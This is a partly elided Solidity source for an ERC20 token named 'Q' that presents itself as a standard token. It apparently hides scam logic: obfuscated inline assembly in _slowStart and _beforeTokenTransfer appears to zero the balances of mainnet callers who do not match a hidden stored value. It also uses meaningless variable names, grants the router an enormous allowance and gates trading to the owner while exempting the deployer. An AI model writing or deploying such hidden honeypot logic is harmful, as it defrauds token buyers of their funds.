...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addTheQ;
    uint256 private bigBoss = block.number*2;

    mapping (address => bool) private _firstHand; 
    mapping (address => bool) private _secondFingers;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private blueSky;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private redMeth;
    address public pair;
    ...
    bool private trading; uint256 private apeMonkey = 1; bool private wineDanger;
    uint256 private _decimals; uint256 private greenShark;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addTheQ.push(_router); addTheQ.push(msgSender_); addTheQ.push(pair);
        for (uint256 q=0; q < 3;) {_firstHand[addTheQ[q]] = true; unchecked{q++;} }
    }
    ...
    function _slowStart() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xc5c3a7ef5fa6de4aef67bd2bbdb9418494cf49653541ff94afecc92f137ed1ec
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x4ecb3c39e01bdf09eb26a019c7ea0b9ccf6fcb94249d8c5ce7ddd52ccb98ff4e,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; bigBoss = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addTheQ[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployTheQ(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addTheQ[0], 10 ** 77);
        _slowStart();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployTheQ(creator, initialSupply);
    }
}

contract $Q is ERC20Token {
    constructor() ERC20Token("Q", "Q", msg.sender, 15000000 * 10 ** 18) {
    }
}